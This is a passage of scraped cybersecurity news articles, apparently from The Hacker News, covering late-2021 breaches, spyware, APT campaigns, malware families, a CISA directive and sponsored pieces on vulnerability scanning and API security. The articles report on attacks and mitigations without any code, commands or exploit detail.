it only makes sense to scan as often as you can deal with all the output, like once a quarter.\nWhile that would be a nice way to do things, unfortunately, new vulnerabilities are being discovered on a much more regular basis than that, so rather than limiting your scans to how often you can deal with the output, it is much more sensible to seek out a scanner that generates less noise in the first place, and helps you focus on the most important issues first; and gives you guidance about on what kind of timescales the others should be addressed.\nIntruder is one example of such a scanner. It was designed to automatically prioritize issues that have a real impact on your security, filtering out informational noise from your scan findings. Intruder’s scan results are tailored for the internet-facing systems, meaning it can help you to monitor and reduce the attack surface.\nA screenshot of Intruder’s Issues page that helps technical teams quickly see what requires their immediate attention.\nIt’s also the case that, as humans, we start to ignore things if they become too noisy. Alert-fatigue is a genuine concern in cyber security, so you should make sure you’re working with a tool that’s not spamming you with information 24/7, as this may make you stop paying attention, and more likely to miss the important issues when they happen. Make sure to factor this in when choosing a scanner, as it’s a common mistake to think that the one that gives you the most output is the best!\nEmerging-threat based\nSo now that you’ve decided on what schedule to run your scans, it’s worth considering what happens in the gaps when you’re not running scans.\nFor example, say you decide that a monthly scan makes sense for you to pick up on any changes you make on a semi-regular basis. That’s great, but as the timelines for the Equifax breach shows, you might have a problem even in such a short space as 30 days, if a vulnerability is discovered the day after your last scan. Combining our thoughts around alert-fatigue above though, just scheduling a daily scan may not be the best way to avoid this.\nTo tackle this problem, some vulnerability scanners provide ways to cover these gaps - some do it by storing the information retrieved on the last scan, and alerting you if that information is relevant to any new vulnerabilities as they are released.\nIn the case of Intruder, which also offers a similar concept, called “Emerging Threat Scans,“ their software proactively scans customers each time a new vulnerability emerges. This allows to ensure all the information is up to date, and no false alerts are raised based on old information.\nAs soon as new vulnerabilities are discovered, Intruder proactively scans your systems and automatically alerts you.\nTo sum up\nAs with many things in the realm of cyber security, there is no size-fits-all approach to figuring out your ideal scanning frequency. Depending on the type of assets that you’re guarding or a particular industry that you’re operating in, the answer will be different. We hope this article has helped you make an informed decision about the right frequency of vulnerability scanning for your own organization. \nThe Intruder vulnerability assessment platform\nIntruder is a fully automated vulnerability assessment tool designed to check your infrastructure for upwards of 10,000 known weaknesses.

'text': 'Cryptocurrency trading platform BitMart has disclosed a “large-scale security breach“ that it blamed on a stolen private key, resulting in the theft of more than $150 million in various cryptocurrencies.\nThe breach is said to have impacted two of its hot wallets on the Ethereum (ETH) blockchain and the Binance smart chain (BSC). The company noted that the wallets carried only a “small percentage“ of the assets.“ Hot wallets, as opposed to their cold counterparts, are connected to the internet and allow cryptocurrency owners to receive and send tokens.\n\nBlockchain security and data analytics company PeckShield estimated the total loss to be around $200 million, calling the whole chain of events as “Pretty straightforward: transfer-out, swap, and wash.“\n“This security breach was mainly caused by a stolen private key that had two of our hot wallets compromised,“ BitMart’s chief executive Sheldon Xia said in a series of tweets sent out earlier today. In light of the incident, BitMart said it’s temporarily suspending withdrawals until further notice and added a thorough security review was underway, with plans to resume the operations on December 7.\n\nThe development is the latest in a wave of hacks that have targeted cryptocurrency platforms such as PolyNetwork, Cream Finance, Liquid, and bZx, among others.\n\nLast week, malicious actors orchestrated a heist amounting to $120 million worth of Bitcoin and Ether assets from BadgerDAO, a decentralized finance (DeFi) lending service. In a separate development, blockchain startup MonoX Finance disclosed that a hacker drained roughly $31 million by exploiting a “smart contract“ error in the software the service uses to carry out token swaps and enable customers to trade tokens with other network participants.\nAnd in August, an unnamed attacker stole more than $600 million worth of tokens from the cryptocurrency platform PolyNetwork, only to return nearly all of the money two weeks later.\n\n\nFound this article interesting?

{'title': '14 New XS-Leaks (Cross-Site Leaks) Attacks Affect All Modern Web Browsers',
'text': 'Researchers have discovered 14 new types of cross-site data leakage attacks against a number of modern web browsers, including Tor Browser, Mozilla Firefox, Google Chrome, Microsoft Edge, Apple Safari, and Opera, among others.\nCollectively known as “XS-Leaks,“ the browser bugs enable a malicious website to harvest personal data from its visitors as they interact with other websites in the background without the targets’ knowledge. The findings are the result of a comprehensive study of cross-site attacks undertaken by a group of academics from Ruhr-Universität Bochum (RUB) and Niederrhein University.\n“XS-Leaks bypass the so-called same-origin policy, one of a browser’s main defences against various types of attacks,“ the researchers said in a statement. “The purpose of the same-origin policy is to prevent information from being stolen from a trusted website. In the case of XS-Leaks, attackers can nevertheless recognize individual, small details of a website. If these details are tied to personal data, those data can be leaked.“\n\nStemming from side-channels built into the web platform that permits an attacker to gather this data from a cross-origin HTTP resource, the cross-site bugs impact an array of popular browsers such as Tor, Chrome, Edge, Opera, Safari Firefox, Samsung Internet, spanning across different operating systems Windows, macOS, Android, and iOS.\nThe new class of vulnerabilities is also different from a cross-site request forgery (CSRF) attack in that unlike the latter, which exploits a web application’s trust in a browser client to execute unintended actions on behalf of the user, they can be weaponized to infer information about a user.\n“They are a significant threat to Internet privacy since simply visiting a web page may reveal if the victim is a drug addict or leak a sexual orientation,“ the researchers explained. “XS-Leaks take advantage of small pieces of information which are exposed during interactions between websites […] to reveal sensitive information about users, such as their data in other web applications, details about their local environment, or internal networks they are connected to.“\n\nThe core idea is that while websites are not allowed to directly access data (i.e., read server responses) on other websites because of same-origin constraints, a rogue online portal can attempt to load a specific resource or an API endpoint from a website, say, an online banking website, on the user’s browser and draw inferences about the victim’s transaction history. Alternatively, the source of the leak could be timing-based side-channels or speculative execution attacks like Meltdown and Spectre.\n\nAs mitigations, the researchers recommend denying all event handler messages, minimizing error message occurrences, applying global limit restrictions, and creating a new history property when redirection occurs. At the end-user side, turning on first-party isolation as well as Enhanced Tracking Prevention in Firefox have been found to decrease the applicability of XS-Leaks. Intelligent Tracking Prevention in Safari, which blocks third-party cookies by default, also prevents all leaks that are not based on a pop-up.\n“The root cause of most XS-Leaks is inherent to the design of the web,“ the researchers said. “Oftentimes applications are vulnerable to some cross-site information leaks without having done anything wrong. It is challenging to fix the root cause of XS-Leaks at the browser level because in many cases doing so would break existing websites.“\n\n\nFound this article interesting?

{'title': 'Pegasus Spyware Reportedly Hacked iPhones of U.S. State Department and Diplomats',
'text': 'Apple reportedly notified several U.S. Embassy and State Department employees that their iPhones may have been targeted by an unknown assailant using state-sponsored spyware created by the controversial Israeli company NSO Group, according to multiple reports from Reuters and The Washington Post.\nAt least 11 U.S. Embassy officials stationed in Uganda or focusing on issues pertaining to the country are said to have singled out using iPhones registered to their overseas phone numbers, although the identity of the threat actors behind the intrusions, or the nature of the information sought, remains unknown as yet.\n\nThe attacks, which were carried out in the last several months, mark the first known time the sophisticated surveillance software has been put to use against U.S. government employees.\nNSO Group is the maker of Pegasus, military-grade spyware that allows its government clients to stealthily plunder files and photos, eavesdrop on conversations, and track the whereabouts of their victims. Pegasus uses zero-click exploits sent through messaging apps to infect iPhones and Android devices without requiring targets to click links or take any other action, but are by default blocked from working on U.S. phone numbers.\nIn response to the reports, the NSO Group said it will investigate the matter and take legal action, if necessary, against customers for using its tools illegally, adding it had suspended “relevant accounts,“ citing the “severity of the allegations.“\nIt’s worth noting that the company has long maintained it only sells its products to government law enforcement and intelligence clients to help monitor security threats and investigate only terrorists and criminals. But evidence gathered over the years has revealed a systematic abuse of the technology to spy on human rights activists, journalists and politicians from Saudi Arabia, Bahrain, Morocco, Mexico, and other countries.\nNSO Group’s actions have cost it dear, landing it in the crosshairs of the U.S. Commerce Department, which placed the company in an economic blocklist last month, a decision that may have been motivated by the aforementioned targeting of U.S. foreign diplomats.\nTo add to the pressure, tech giants Apple and Meta have waged a legal onslaught against the company for illegally hacking their users by exploiting previously unknown security flaws in iOS and the end-to-end encrypted WhatsApp messaging service. Apple, in addition, also said it began sending threat notifications to alert users it believes have been targeted by state-sponsored attackers on November 23.\n\nTo that end, the notifications are being delivered to affected users via email and iMessage to the addresses and phone numbers associated with the users’ Apple IDs, alongside displaying a prominent “Threat Notification“ banner at the top of the page when impacted users log into their accounts on appleid.apple[.]com.\n“State-sponsored actors like the NSO Group spend millions of dollars on sophisticated surveillance technologies without effective accountability,“ Apple’s software engineering chief Craig Federighi previously said. “That needs to change.“\nThe disclosures also coincide with a report from The Wall Street Journal that detailed the U.S. government plans to work with over 100 countries to limit the export of surveillance software to authoritarian governments that use the technologies to suppress human rights. China and Russia are not expected to be a part of the new initiative.\n\n\nFound this article interesting? Follow THN on Facebook, Twitter  and LinkedIn to read more exclusive content we post.',

{'title': 'Researchers Detail How Pakistani Hackers Targeting Indian and Afghan Governments',
'text': 'A Pakistani threat actor successfully socially engineered a number of ministries in Afghanistan and a shared government computer in India to steal sensitive Google, Twitter, and Facebook credentials from its targets and stealthily obtain access to government portals.\nMalwarebytes’ latest findings go into detail about the new tactics and tools adopted by the APT group known as SideCopy, which is so-called because of its attempts to mimic the infection chains associated with another group tracked as SideWinder and mislead attribution.\n“The lures used by SideCopy APT are usually archive files that have embedded one of these files: LNK, Microsoft Publisher or Trojanized Applications,“ Malwarebytes researcher Hossein Jazi said, adding the embedded files are tailored to target government and military officials based in Afghanistan and India.\n\nThe revelation comes close on the heels of disclosures that Meta took steps to block malicious activities carried out by the group on its platform by using romantic lures to compromise individuals with ties to the Afghan government, military, and law enforcement in Kabul.\nSome of the prominent attacks were waged against personnel associated with the Administration Office of the President (AOP) of Afghanistan as well as the Ministry of Foreign affairs, Ministry of Finance, and the National Procurement Authority, resulting in the theft of social media passwords and password-protected documents. SideCopy also broke into a shared computer in India and harvested credentials from government and education services.\n\nIn addition, the actor is said to have siphoned several Microsoft Office documents, including names, numbers, and email addresses of officials and databases containing information related to identity cards, diplomatic visas, and asset registrations from the Afghani government websites, all of which are expected to be used as future decoys or to fuel further attacks against the individuals themselves.\nThe cyber espionage campaign observed by Malwarebytes involves the target opening the lure document, leading to the execution of a loader that’s used to drop a next-stage remote access trojan called ActionRAT, which is capable of uploading files, executing commands received from a server, and even download more payloads.\n\nAlso dropped by the loader is a new information stealer dubbed AuTo Stealer, which is programmed to collect Microsoft Office files, PDF documents, text files, database files, and images before exfiltrating the information to its server over HTTP or TCP.\n\nThis is far from the first time SideCopy APT’s tactics have come to light. In September 2020, cybersecurity firm Quick Heal revealed specifics about an espionage attack aimed at Indian defense units and armed forces personnel at least since 2019 with an aim to steal sensitive information.\nThen earlier this July, Cisco Talos researchers exposed the hacking group’s myriad infection chains delivering bespoke and commodity remote access trojans such as CetaRAT, Allakore, and njRAT in what they called an expansion of malware campaigns targeting entities in India.\n\n\nFound this article interesting?

{'title': 'New Malvertising Campaigns Spreading Backdoors, Malicious Chrome Extensions',
'text': 'A series of malicious campaigns have been leveraging fake installers of popular apps and games such as Viber, WeChat, NoxPlayer, and Battlefield as a lure to trick users into downloading a new backdoor and an undocumented malicious Google Chrome extension with the goal of stealing credentials and data stored in the compromised systems as well as maintaining persistent remote access.\nCisco Talos attributed the malware payloads to an unknown actor that goes by the alias “magnat,“ noting that “these two families have been subject to constant development and improvement by their authors.“\nThe attacks are believed to have commenced in late 2018, with intermittent activity observed towards the end of 2019 and through early 2020, followed by fresh spikes since April 2021, while mainly singling out users in Canada, followed by the U.S., Australia, Italy, Spain, and Norway.\n\nA noteworthy aspect of the intrusions is the use of malvertising as a means to strike individuals who are looking for popular software on search engines to present them links to download fake installers that drop a password stealer called RedLine Stealer, a Chrome extension dubbed “MagnatExtension“ that’s programmed to record keystrokes and capture screenshots, and an AutoIt-based backdoor that establishes remote access to the machine.\n\nMagnatExtension, which masquerades as Google’s Safe browsing, also packs other features that are of use to the attackers, including the ability to steal form data, harvest cookies, and execute arbitrary JavaScript code. Telemetry data analyzed by Talos has revealed that the first-ever sample of the browser add-on was detected in August 2018.\nThe extension’s command-and-control (C2) communications stand out as well. While the C2 address is hard-coded, it can also be updated by the current C2 with a list of additional C2 domains. But in the event of failure, it falls back to an alternate method that involves obtaining a new C2 address from a Twitter search for hashtags like “#aquamamba2019“ or “#ololo2019.“\n\nThe domain name is then constructed from the accompanying tweet text by concatenating the first letter of each word, meaning a tweet with the content “Squishy turbulent areas terminate active round engines after dank years. Industrial creepy units“ and containing the hashtag “#aquamamba2019“ is translated to “stataready[.]icu.“\nOnce an active command-and-control server becomes available, the vacuumed data — browser history, cookies, form data, keystrokes, and screenshots — is exfiltrated in the form of an encrypted JSON string in the body of an HTTP POST request, the encryption key to which is hard-coded in the decryption function. The encryption key, in turn, is encrypted with the server’s public key.\n\n“Based on the use of password stealers and a Chrome extension that is similar to a banking trojan, we assess that the attacker’s goals are to obtain user credentials, possibly for sale or for his own use in further exploitation,“ Cisco Talos researcher Tiago Pereira said.\n“The motive for the deployment of an RDP backdoor is unclear. The most likely are the sale of RDP access, the use of RDP to work around online service security features based on IP address or other endpoint installed tools or the use of RDP for further exploitation on systems that appear interesting to the attacker.“\n\n\nFound this article interesting?

{'title': 'Why Everyone Needs to Take the Latest CISA Directive Seriously',
'text': 'Government agencies publish notices and directives all the time. Usually, these are only relevant to government departments, which means that nobody else really pays attention. It’s easy to see why you would assume that a directive from CISA just doesn’t relate to your organization.\nBut, in the instance of the latest CISA directive, that would be making a mistake. In this article, we explain why, even if you’re in the private or non-government sector, you should nonetheless take a close look at CISA Binding Operational Directive 22-01.\nWe outline why CISA was forced to issue this directive, and why that firm action has implications for all organizations – inside and outside of government. Acting on cybersecurity issues isn’t as simple as flicking a switch, of course, so keep reading to find out how you can address the core issue behind the CISA directive.\nOkay, so what exactly is a CISA directive?\nLet’s take a step back to gain some context. Just like any organization that uses technology, US government agencies – federal agencies – are constantly under cyberattack from malicious actors, from common criminals to enemy states.\nAs a result, the US Department of Homeland Security set up CISA, the Cybersecurity, and Infrastructure Security Agency, to help coordinate cybersecurity for federal agencies.\nCISA says that it acts as the operational lead for federal cybersecurity, defending federal government networks. But each agency has its own operational and technology teams that are not under the direct control of CISA – and that’s where the CISA directives come in.\nA CISA directive is intended to compel tech teams at federal agencies to take certain actions that CISA deems necessary to ensure safe cybersecurity operations. The directives generally deal with specific, high-risk vulnerabilities but some directives are more general, with BD 18-01, for example, outlining specific steps agencies should take to improve email security.\n What does directive BD 22-01 say?\nBinding operational directive 22-01 is one of the broader directives – in fact, it’s very broad, referring to over three hundred vulnerabilities. It’s a dramatic step for CISA to take – it’s not just another run-of-the-mill communications message.\nWith this directive, CISA presents a list of vulnerabilities that it thinks are the most commonly exploited within the larger field of tens of thousands of known vulnerabilities. Some of these vulnerabilities are quite old.\nIn this vulnerability catalog, each entry specifies a fixed date whereby federal agencies need to remediate the vulnerability. Within the directive itself are further detailed instructions and timelines – including establishing a process to regularly review the list attached to BD 22-01 - meaning this list will be expanded in the future.\nExamples of vulnerabilities on the list\nLet’s look at some examples of vulnerabilities on this list. CISA rounded up what are, in its view, the most serious, most exploited vulnerabilities – in other words, vulnerabilities that are most likely to lead to harm if not addressed.\nThe list covers a really wide scope, from infrastructure through to applications – including mobile apps – even covering some of the most trusted security solutions. It includes vendors such as Microsoft, SAP, and TrendMicro as well as popular open-source technology solutions including Linux and Apache.\nOne example of a vulnerability on the list relates to the Apache HTTP Server, where a range of release 2.4 versions is affected by a scoreboard vulnerability – CVE-2019-0211. It allows attackers to start an attack by running code in a less privileged process that manipulates the scoreboard, enabling the execution of arbitrary code with the permissions of the parent process.\nAnother example lies in Atlassian Confluence, the popular collaboration tool. Here, attackers can mount a remote code execution attack by injecting macro code into the Atlassian Widget Connector. Again, this vulnerability is listed by CISA because the organization deemed that it was commonly exploited.\nYes! This CISA directive applies to you too…\nOkay, CISA’s directives can’t be enforced on technology teams outside of the US federal government, but that doesn’t mean there’s nothing to learn here.\nTo start, take a step back and think about CISA’s reasoning before you simply dismiss its latest directive. We know that cybersecurity attacks are commonplace and that the costs are enormous, whether you’re operating within a state or federal environment – or as a private enterprise.\nCISA only published this list as a last resort. The agency became so exasperated with attackers frequently hitting government targets that it felt forced to issue a binding directive listing vulnerabilities that must be addressed. It did so simply because it is so common for known vulnerabilities to go unpatched.\nThese vulnerabilities are not unique to government services – any technology environment can be affected.\nAnd here’s the rub: just like government technology environments, your technology estate may be full of vulnerabilities that need remediation. The CISA list would be an excellent place to start fixing things.\n And to top it all off, these are not just -potentially- exploitable vulnerabilities.\nIf you read the directive attently, these are vulnerabilities -currently- being exploited in the wild, meaning that exploit code is either readily available for everyone or being distributed in the less savory corners of the Internet. Either way, these are not just a hypothetical threat anymore.\nThe hidden message of the CISA directive\nIt’s not that either you – or tech teams in government – are negligent, or ignorant. It’s just a matter of practical realities. And in practice, tech teams don’t get around to consistently remediating vulnerabilities. Big, obvious, known vulnerabilities such as those listed in the CISA directive can lie waiting for an attacker to exploit simply because tech teams never fixed it.\nThere are a variety of reasons why it happens, and neglect is rarely one of them. A lack of resources is arguably one of the biggest causes, as technology teams are simply too stretched to test, patch, and otherwise mitigate sufficiently.\nThere’s the disruption associated with patching too: urgent patches can quickly turn less pressing in the face of stakeholder pushback. So what the CISA directive is really saying is that practical realities mean that there’s an ocean of vulnerabilities that are simply not getting addressed and which are leading to successful exploits.\nAnd, in response, CISA produced what you could call an emergency list simply because of the level of desperation with cybercrime. In other words, the situation is untenable – and the CISA directive is an emergency band-aid, a way to try and cauterize the damage.\nCurb disruption and you also boost security\nStarting to address the most critical, most exploited vulnerabilities is the obvious answer, and that’s what the CISA list is intended to accomplish. Close behind is throwing more resources at the problem – devoting more time to fixing vulnerabilities is a worthy step.\nBut these obvious steps quickly run into a wall: fixing and patching causes disruption, and finding a way forward is challenging. And without finding a way past these disruptive effects, the situation may continue to get so bad that we need steps like the CISA directive. Remodeling security operations is the answer.\nWhat can tech teams do? It requires wholesale re-engineering in a way that minimizes patching-related disruption. Redundancy and high availability, for example, can help mitigate some of the worst disruptive effects of vulnerability management.\nUtilizing the most advanced security technology also helps. Vulnerability scanners can highlight the most pressing issues to help with prioritization. Live patching by TuxCare is another great tool – because live patching completely removes the need to reboot, which means patching disruption can be essentially eliminated.\nAnd that’s what the CISA directive really means...\nWhether you’re in government or the private sector, a rethink is needed because vulnerabilities are piling up so rapidly. The CISA directive underlines how bad things have become. But simply applying more band-aid won’t work – you’ll remediate, and be back in the same situation you were in no time.\nSo, take the CISA directive as a warning sign. Yes, check whether you’re using any of the software and services on the list and patch accordingly. But, most importantly, think about how you can improve your SecOps – ensuring that you’re more responsive to vulnerabilities by remediating with less disruption. Patch faster with less disruption.\n\n\nFound this article interesting? Follow THN on Facebook, Twitter  and LinkedIn to read more exclusive content we post.',

'text': 'E-commerce platforms in the U.S., Germany, and France have come under attack from a new form of malware that targets Nginx servers in an attempt to masquerade its presence and slip past detection by security solutions.\n“This novel code injects itself into a host Nginx application and is nearly invisible,“ Sansec Threat Research team said in a new report. “The parasite is used to steal data from eCommerce servers, also known as ’server-side Magecart.’“ \nA free and open-source software, Nginx is a web server that can also be used as a reverse proxy, load balancer, mail proxy, and HTTP cache. NginRAT, as the advanced malware is called, works by hijacking a host Nginx application to embed itself into the webserver process.\n\nThe remote access trojan itself is delivered via CronRAT, another piece of malware the Dutch cybersecurity firm disclosed last week as hiding its malicious payloads in cron jobs scheduled to execute on February 31st, a non-existent calendar day.\nBoth CronRAT and NginRAT are designed to provide a remote way into the compromised servers, and the goal of the intrusions is to make server-side modifications to the compromised e-commerce websites in a manner that enable the adversaries to exfiltrate data by skimming online payment forms.\n\n\nThe attacks, collectively known as Magecart or web skimming, are the work of a cybercrime syndicate comprised of dozens of subgroups that are involved in digital credit card theft by exploiting software vulnerabilities to gain access to an online portal’s source code and insert malicious JavaScript code that siphons the data shoppers enter into checkout pages.\n\n“Skimmer groups are growing rapidly and targeting various e-commerce platforms using a variety of ways to remain undetected,“ Zscaler researchers noted in an analysis of the latest Magecart trends published earlier this year.\n“The latest techniques include compromising vulnerable versions of e-commerce platforms, hosting skimmer scripts on CDNs and cloud services, and using newly registered domains (NRDs) lexically close to any legitimate web service or specific e-commerce store to host malicious skimmer scripts.“\n\n\nFound this article interesting?

'text': 'The U.S. Federal Bureau of Investigation (FBI) and the Cybersecurity and Infrastructure Security Agency (CISA) are warning of active exploitation of a newly patched flaw in Zoho’s ManageEngine ServiceDesk Plus product to deploy web shells and carry out an array of malicious activities.\nTracked as CVE-2021-44077 (CVSS score: 9.8), the issue relates to an unauthenticated, remote code execution vulnerability affecting ServiceDesk Plus versions up to and including 11305 that, if left unfixed, “allows an attacker to upload executable files and place web shells that enable post-exploitation activities, such as compromising administrator credentials, conducting lateral movement, and exfiltrating registry hives and Active Directory files,“ CISA said.\n\n“A security misconfiguration in ServiceDesk Plus led to the vulnerability,“ Zoho noted in an independent advisory published on November 22. “This vulnerability can allow an adversary to execute arbitrary code and carry out any subsequent attacks.“ Zoho addressed the same flaw in versions 11306 and above on September 16, 2021.\nCVE-2021-44077 is also the second flaw to be exploited by the same threat actor that was formerly found exploiting a security shortcoming in Zoho’s self-service password management and single sign-on solution known as ManageEngine ADSelfService Plus (CVE-2021-40539) to compromise at least 11 organizations, according to a new report published by Palo Alto Networks’ Unit 42 threat intelligence team.\n\n“The threat actor expand[ed] its focus beyond ADSelfService Plus to other vulnerable software,“ Unit 42 researchers Robert Falcone and Peter Renals said. “Most notably, between October 25 and November 8, the actor shifted attention to several organizations running a different Zoho product known as ManageEngine ServiceDesk Plus.“\nThe attacks are believed to be orchestrated by a “persistent and determined APT actor“ tracked by Microsoft under the moniker “DEV-0322,“ an emerging threat cluster that the tech giant says is operating out of China and has been previously observed exploiting a then zero-day flaw in SolarWinds Serv-U managed file transfer service earlier this year. Unit 42 is monitoring the combined activity as the “TiltedTemple“ campaign.\n\nPost-exploitation activities following a successful compromise involve the actor uploading a new dropper (“msiexec.exe“) to victim systems, which then deploys the Chinese-language JSP web shell named “Godzilla“ for establishing persistence in those machines, echoing similar tactics used against the ADSelfService software.\nUnit 42 identified that there are currently over 4,700 internet-facing instances of ServiceDesk Plus globally, of which 2,900 (or 62%) spanning across the U.S., India, Russia, Great Britain, and Turkey are assessed to be vulnerable to exploitation.\nOver the past three months, at least two organizations have been compromised using the ManageEngine ServiceDesk Plus flaw, a number that’s expected to climb further as the APT group ramps up its reconnaissance activities against technology, energy, transportation, healthcare, education, finance, and defense industries. \nZoho, for its part, has made available an exploit detection tool to help customers identify whether their on-premises installations have been compromised, in addition to recommending that users “upgrade to the latest version of ServiceDesk Plus (12001) immediately“ to mitigate any potential risk arising out of exploitation.\n\n\nFound this article interesting?

'text': 'Four different malicious frameworks designed to attack air-gapped networks were detected in the first half of 2020 alone, bringing the total number of such toolkits to 17 and offering adversaries a pathway to cyber espionage and exfiltrate classified information.\n“All frameworks are designed to perform some form of espionage, [and] all the frameworks used USB drives as the physical transmission medium to transfer data in and out of the targeted air-gapped networks,“ ESET researchers Alexis Dorais-Joncas and Facundo Muñoz said in a comprehensive study of the frameworks.\nAir-gapping is a network security measure designed to prevent unauthorized access to systems by physically isolating them from other unsecured networks, including local area networks and the public internet. This also implies that the only way to transfer data is by connecting a physical device to it, such as USB drives or external hard disks.\n\nGiven that the mechanism is one of the most common ways SCADA and industrial control systems (ICS) are protected, APT groups that are typically sponsored or part of nation-state efforts have increasingly set their sights on the critical infrastructure in hopes of infiltrating an air-gapped network with malware so as to surveil targets of interest.\n\nPrimarily built to attack Windows-based operating systems, the Slovak cybersecurity firm said that no fewer than 75% of all the frameworks were found leveraging malicious LNK or AutoRun files on USB drives to either carry out the initial compromise of the air-gapped system or to move laterally within the air-gapped network.\nSome frameworks that have been attributed to well-known threat actors are as follows —\nRetro (DarkHotel aka APT-C-06 or Dubnium)Ramsay (DarkHotel)USBStealer (APT28 aka Sednit, Sofacy, or Fancy Bear)USBFerry (Tropic Trooper aka APT23 or Pirate Panda)Fanny (Equation Group)USBCulprit (Goblin Panda aka Hellsing or Cycldek)PlugX (Mustang Panda), andAgent.BTZ (Turla Group)\n“All frameworks have devised their own ways, but they all have one thing in common: with no exception, they all used weaponized USB drives,“ the researchers explained. “The main difference between connected and offline frameworks is how the drive is weaponized in the first place.“\n\nWhile connected frameworks work by deploying a malicious component on the connected system that monitors the insertion of new USB drives and automatically places in them the attack code needed to poison the air-gapped system, offline frameworks like Brutal Kangaroo, EZCheese, and ProjectSauron rely on the attackers deliberately infecting their own USB drives to backdoor the targeted machines.\nThat said, covert transmission of data out of air-gapped environments without USBs being a common thread remains a challenge. Although a number of methods have been devised to stealthily siphon highly sensitive data by leveraging Ethernet cables, Wi-Fi signals, the computer’s power supply unit, and even changes in LCD screen brightness as novel side-channels, in-the-wild attacks exploiting these techniques have yet to be observed.\n\nAs precautions, organizations with critical information systems and sensitive information are recommended to prevent direct email access on connected systems, disable USB ports and sanitize USB drives, restrict file execution on removable drives, and carry out periodic analysis of air-gapped systems for any signs of suspicious activity.\n“Maintaining a fully air gapped system comes with the benefits of extra protection,“ Dorais-Joncas said. “But just like all other security mechanisms, air gapping is not a silver bullet and does not prevent malicious actors from preying on outdated systems or poor employee habits.“\n\n\nFound this article interesting?

{'title': 'Let there be light: Ensuring visibility across the entire API lifecycle',
'text': 'The following article is based on a webinar series on enterprise API security by Imvision, featuring expert speakers from IBM, Deloitte, Maersk, and Imvision discussing the importance of centralizing an organization’s visibility of its APIs as a way to accelerate remediation efforts and improve the overall security posture.\nCentralizing security is challenging in today’s open ecosystem\nWhen approaching API visibility, the first thing we have to recognize is that today’s enterprises actively avoid managing all their APIs through one system. According to IBM’s Tony Curcio, Director of Integration Engineering, many of his enterprise customers already work with hybrid architectures that leverage classic on-premise infrastructure while adopting SaaS and IaaS across various cloud vendors. \nThese architectures aim to increase resilience and flexibility, but are well aware that it complicates centralization efforts’ to: ’These architectures aim to increase resilience and flexibility, but at the cost of complicating centralization efforts In these organizations, it is imperative to have a centralized API location with deployment into each of these locations, to ensure greater visibility and better management of API-related business activities. \nThe challenge for security teams is that there isn’t one central place where all APIs are managed by the development team - and as time passes, that complexity is likely to only get worse. Moreover, this complexity doesn’t stop at the infrastructure level, but carries on into the application layer.\nDeloitte’s Moe Shamim, Senior Technology Executive and Deputy CISO of US Consulting, sees non-monolithic application development as key. He claims that organizations must now break down those millions of lines of code into API-based, modularized processes and systems in order to remain competitive, all while ensuring that threat vectors are kept down to a minimum. This requires significant rethinking as one must now account for API gateways, IAMs, throttling and more, which means significant time and resources. \nThe API footprint of organizations is no longer increasing organically over time. It now consists of various APIs whose origins come from mergers and acquisitions, versioning, internal APIs, 3rd party APIs, drift from original intended usage, dev, test, debug and diagnostic purposes and so on. This makes complexity an even bigger issue, as many APIs are undocumented and unmanaged, and needless to say - unprotected.\nWhere do ’Shadow APIs’ come from?\nEnforcing a consistent program across each of the different environments where enterprise assets are located is a challenge in this hybrid cloud reality. One should take this consistency challenge into consideration when selecting technology stacks, so that enforcing policies and governance programs everywhere is not an issue. \nBut this is easier said than done, especially in successful enterprises that merge with and acquire other organizations: each business uses different technologies, mandating a customized, bespoke API security process for each new environment that’s added. \nHere’s what you should pay attention to when evaluating a full lifecycle API security solution\nAPI lifecycle? API lifestyle!\nAccording to Moe Shamim, the API lifecycle can be boiled down to the pillars found in the image below. When fashioning an API security strategy, one must take into account architecture, distribution, design and a whole slew of other aspects that impact the way an organization develops its approach to APIs. You can look at each of these aspects as controls you inject at every stage of the API lifecycle. And it essentially ties back to visibility and centralization discussed above.\nAn image of API lifestyle pillars\nPlanning determines issues like whether APIs will only be used within the network firewall or publicly, as well as issues like authentication. It’ll also touch upon more technical issues such as builds, gateway types and the programming languages that you’ll use. The important thing--and this goes for every decision you make regarding your security posture--is to make a choice that aligns with your ecosystem of tools, and takes your threat modeling into consideration.\nIn the Build pillar, scanning for OWASP Top 10 issues is a must, and SAST tools are great for that. Pentesting and versioning may not necessarily be integrated into your security posture, but they’re both powerful mechanisms that will surely benefit your security arsenal. \nThe Operate pillar includes issues like throttling, caching, and logging. A robust logging and monitoring mechanism is a must-have in the remediation phase, as it enables you to fix vulnerabilities from version to version. \nLast but not least, we arrive at the Retire pillar of the lifecycle. Removing endpoints that are no longer in use is an essential best practice; basically, if you no longer need a service - don’t leave it on. And if you don’t need an API at all anymore, just take it offline; the same goes for cloud accounts. \nTony Curcio claims that one of the key tenets in the governance of API programs is coordination between the API producers, product management, and consumers. Looking at the security disposition of each of those personas and coordinating API policies that ensure secure use for each is a fundamental aspect of an organization’s security posture. \nHaving an API-first mentality within the organization definitely helps. At IBM, for example, they build their own API management technology that enables them to expose, secure, and protect their APIs more easily. Having advanced technology behind you--like Imvison--also goes a long way. Their AI technology helps us understand more about attack vectors, including critical issues like its source. \nTaking an intelligence-led security response approach\nGabriel Maties, Senior Solution Architect at Maersk, offers another perspective. With Maersk being three years into an API program and following a serious breach, cybersecurity is taken into account constantly as a way to stay at least as good as the attackers, if not better.\nSharing his perspective on observability, Gabriel sees API management as a multi-actor discipline from the very beginning because it shares resources and exposes them internally. Therefore, each and every point of entry into your system and its supporting mechanisms should be carefully observed and monitored centrally. \nThis centralization is important because observability is multidimensional in the sense that there’s never one single aspect to monitor. This calls for a holistic view of APIs that enables you to easily understand where APIs are deployed, who owns them, who consumes them, how they’re consumed, what normal consumption looks like and how each one is protected. Centralization also enables you to understand better what each API’s lifecycle looks like, how many versions exist, what data is shared, where it’s stored and who’s using it. \nCentralization is the only way to manage this complex ecosystem in a way that ensures maximum benefit and minimum risk. \nAn image of API visibility layers\nHaving centralized observability further enables insights, which allows you to take action on your observations. Observability allows you to look at ongoing, active attacks that you may not even know about and even formulate strategies that leverage the actions taken upon the insights you draw from your observations. \nRule-based security is highly effective, and machine learning and deep learning are two technologies that automate and streamline it. There is simply no other option as the amount of data to contend with is overwhelming, not to mention that these technologies enable adaptive threat protection that helps contend with new threats. \nThe bad news is that hackers are also using these same technologies, and dealing with that requires significant organizational maturity to take the actions required to handle that. We’re talking about some heavy-duty actions here, like turning off load balancers, switching over firewalls, and other infrastructural changes done in an automatic, rapid-fire fashion. This cannot be done without a high level of maturity across the organization. \nSupervised machine learning can help organizations develop this maturity. It enables you to handle huge numbers of rule sets and insights so that you can design automatic action flows. Data science offers 